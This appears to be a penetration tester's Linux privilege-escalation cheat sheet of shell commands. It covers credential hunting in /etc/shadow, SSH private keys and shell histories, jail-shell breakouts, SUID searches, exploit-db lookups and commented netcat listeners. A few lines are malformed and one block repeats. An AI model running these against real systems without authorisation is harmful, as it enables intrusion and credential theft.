# http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/?redirect
# Operating System Enumeration
# Determine linux distribution and version
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release
cat /etc/redhat-release
cat /etc/os-release
# Determine kernel version - 32 or 64-bit?
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
# List environment variables
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
# Determine if there is a printer
lpstat -a
# Applications and Services Enumeration
# Determine which services are running
ps aux
ps -ef
# top
cat /etc/service
# Determine which services are running as root
ps aux | grep root
ps -ef | grep root
# Determine installed applications
# What applications are installed? What version are they? Are they currently running?
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
yum list | grep installed
# Solaris: 
pkginfo
# Arch Linux: 
pacman -Q
# Determine versions of important applications

gcc -v
mysql --version
java -version
python --version
ruby -v
perl -v
# Review installed configurations
# Syslog Configuration
# Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?
cat /etc/syslog.conf
Web Server Configurations
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/apache2/apache2.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
# PHP Configuration
cat /etc/php5/apache2/php.ini
# Printer (cupsd) Configuration
cat /etc/cups/cupsd.conf
# MySQL Configuration
cat /etc/my.conf
# Inetd Configuration
cat /etc/inetd.conf
# List All
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'
# Determine scheduled jobs,What jobs are scheduled?
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
# Locate any plaintext usernames and passwords,Any plain text usernames and/or passwords?
grep -i user /etc/passwd
grep -i pass /etc/shadow
grep -C 5 "password" /etc/shadow
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"
# Communications and Networking Enumeration
# Identify connected NICs and other networks,What NIC(s) does the system have? Is it connected to another network?
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
# Identify connected users and hosts,What other users & hosts are communicating with the system?
lsof -nPi
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w
# Identify cached IP or MAC addresses,Whats cached? IP and/or MAC addresses
arp -a
route
route -n
/sbin/route -nee
ip ro show
# Identify network configuration Settings (DHCP, DNS, Gateway), What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?
cat /etc/resolv.conf
cat /etc/hosts
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
iptables -t nat -L
hostname
dnsdomainname
# Is packet sniffing possible

# tcpdump tcp dst [ip] [port] and tcp dst [ip] [port],Is packet sniffing possible? What can be seen? Listen to live traffic
# tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21
# Check for ports open for local only connections

netstat -tupan
# Is tunnelling possible
# Is tunnelling possible? Send commands locally, remotely
# ssh -D 127.0.0.1:9050 -N [username]@[ip] 
# proxychains ifconfig

# User and Confidential Information Enumeration
# Identify the current user and users in the system
# Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?
id
who
w
last 
cat /etc/passwd | cut -d :  -f 1  # List users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
# List Sudoers
cat /etc/sudoers
# Show which commands sudo allows you to run

sudo -l|grep -Ev "^$|^#.*"
# Attempt to display sensitive files
# What sensitive files can be found?
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
# Check for anything interesting in home directories
# Anything "interesting" in the home directorie(s)? If it's possible to access
ls -ahlR /root/
ls -ahlR /home/
# Are there any hardcoded passwords in scripts, databases or configuration files
# Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD 
cat /root/anaconda-ks.cfg
# **Dump all Local, LDAP, NIS, etc password hashes

# getent passwd
# Check user history for credentials and activity
# What has the user being doing? Is there any password in plain text? What have they been edting?
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history 
cat ~/.php_history
# Check user profile and mail
# What user information can be found?
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
# Check for mail aliases or all aliases

cat /etc/aliases
# getent aliases
# Check for accessible private keys
# Can private-key information be found?
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
# File System Enumeration
# The following commands are helpful when looking to exploit local applications for privilege escalation
# Find writeable configuration files in /etc
# Which configuration files can be written in /etc/? Able to reconfigure a service?
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null        # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null          # Other

find /etc/ -readable -type f 2>/dev/null                         # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
# Examine /var structure (logs, configuration files
# What can be found in /var/ ?
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd 
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases
# Any hidden files / settings on a hosted website
# Any settings/files (hidden) on website? Any settings file with database information?
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/ 
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 
ls -alhR /var/www/html/
# Check Local Log Files

# http://www.thegeekstuff.com/2011/08/linux-var-log-files/
# Is there anything in the log file(s) (Could help with "Local File Includes"!)
cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/
# auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
# Is it possible to break out of "jail" shell

python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
vi -> :sh or :!UNIX_command
# Check which filesystems are mounted,How are file-systems mounted?
mount
df -h
# Check if there are unmounted filesystems,Are there any unmounted file-systems?
cat /etc/fstab
# Finding world writeable directories

find / -perm 777
# Find setuid files
find / -perm +4000 -type f
# Find root setuid files
find / -perm +4000 -uid 0 -type f
# Additional File System Checks? Sticky bits, SUID & GUID
find / -perm -1000 -type d 2>/dev/null    # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the  group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the  owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
# Check common directories for write and execute permissions
find / -writable -type d 2>/dev/null        # world-writeable folders
find / -perm -222 -type d 2>/dev/null      # world-writeable folders
find / -perm -o+w -type d 2>/dev/null    # world-writeable folders
find / -perm -o+x -type d 2>/dev/null    # world-executable folders
find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders
# Check for problem files (World Writeable / "Nobody" files)
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
# Exploitation
# Attacking Vulnerable Kernel and SUID Applications
# Finding Exploit Code
/pentest/exploits/exploitdb/searchsploit "kernel"  |grep -i "root"
cat /pentest/exploits/exploitdb/files.csv |grep -i privile
grep -i X.X /pentest/exploits/exploitdb/files.csv |grep -i local 
grep -i application /pentest/exploits/exploitdb/files.csv |grep -i local
# Check Development Environment on Target Hosts
find / -name perl*
find / -name python*
find / -name gcc* 
find / -name cc
# How can files be uploaded?
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp* 
find / -name ftp
# Automated Checks:standard
unix-privesc-check detailed

# Have you got a shell? Can you interact with the system?
# nc -lvp 4444
# nc -lvp 4445
which wget;which nc;which netcat;which tftp;which ftp;
which perl;which python;which gcc;which cc

# Any "problem" files? Word-writeable, "nobody" files
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
# Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
find / -writable -type d 2>/dev/null      # world-writeable folders
find / -perm -222 -type d 2>/dev/null     # world-writeable folders
find / -perm -o w -type d 2>/dev/null     # world-writeable folders
find / -perm -o x -type d 2>/dev/null     # world-executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
# What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
